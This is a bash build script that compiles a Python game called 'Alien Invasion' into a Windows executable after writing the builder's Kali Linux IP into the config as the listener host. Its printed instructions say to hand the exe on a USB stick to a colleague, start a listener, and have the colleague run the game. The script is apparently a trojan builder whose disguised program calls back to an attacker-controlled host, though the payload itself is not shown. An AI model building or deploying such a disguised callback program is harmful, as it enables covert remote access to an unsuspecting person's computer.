#!/bin/bash
# Quick build script for creating Windows .exe

echo "=========================================="
echo "Alien Invasion - Quick Build for Windows"
echo "=========================================="
echo ""

# Get Kali IP
echo "Step 1: Getting your Kali IP address..."
KALI_IP=$(hostname -I | awk '{print $1}')
echo "Your Kali IP: $KALI_IP"
echo ""

# Ask user to confirm or enter different IP
read -p "Is this correct? (y/n): " confirm
if [ "$confirm" != "y" ]; then
    read -p "Enter your Kali IP address: " KALI_IP
fi

echo ""
echo "Step 2: Updating config.py with IP: $KALI_IP"

# Update config.py
sed -i "s/LISTENER_HOST = '.*'/LISTENER_HOST = '$KALI_IP'/" config.py

echo "✓ config.py updated"
echo ""

# Check if PyInstaller is installed
echo "Step 3: Checking PyInstaller..."
if ! python3 -c "import PyInstaller" 2>/dev/null; then
    echo "PyInstaller not found. Installing..."
    pip3 install pyinstaller
fi
echo "✓ PyInstaller ready"
echo ""

# Build the .exe
echo "Step 4: Building Windows executable..."
echo "This may take a few minutes..."
echo ""

python3 build_windows_exe.py

if [ $? -eq 0 ]; then
    echo ""
    echo "=========================================="
    echo "✓ BUILD SUCCESSFUL!"
    echo "=========================================="
    echo ""
    echo "Files ready for Windows:"
    echo "  → dist/AlienInvasion.exe"
    echo "  → images/ folder"
    echo ""
    echo "Next steps:"
    echo "1. Copy dist/AlienInvasion.exe to USB"
    echo "2. Copy images/ folder to USB"
    echo "3. Give USB to your colleague"
    echo "4. Start listener: python3 listener.py"
    echo "5. Colleague runs AlienInvasion.exe"
    echo ""
    echo "Your Kali IP (for reference): $KALI_IP"
    echo ""
else
    echo ""
    echo "✗ Build failed. Check errors above."
    exit 1
fi
